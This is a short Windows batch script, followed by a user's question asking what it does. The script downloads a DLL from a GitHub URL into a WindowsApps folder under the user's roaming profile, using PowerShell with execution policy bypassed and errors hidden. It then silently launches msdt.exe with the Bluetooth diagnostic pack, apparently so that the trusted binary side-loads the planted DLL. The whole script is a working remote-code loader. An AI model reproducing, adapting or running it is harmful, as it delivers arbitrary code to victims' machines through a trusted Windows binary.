@echo off
setlocal enabledelayedexpansion

:: Create a custom subfolder in Roaming
set "dll_url=https://github.com/Sabu-coder/TSL/raw/refs/heads/main/BluetoothDiagnosticUtil.dll"
set "dll_folder=%APPDATA%\Microsoft\WindowsApps"
set "dll_path=%dll_folder%\BluetoothDiagnosticUtil.dll"
set "msdt_path=C:\Windows\SysWOW64\msdt.exe"

:: Create the folder if it doesn't exist
if not exist "%dll_folder%" (
    mkdir "%dll_folder%" 2>nul
)

:: Download DLL
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('%dll_url%','%dll_path%')" 2>nul

:: Run msdt.exe
start /b "" "%msdt_path%" -path "C:\WINDOWS\diagnostics\index\BluetoothDiagnostic.xml" -skip yes

exit /b 0 what does this code do 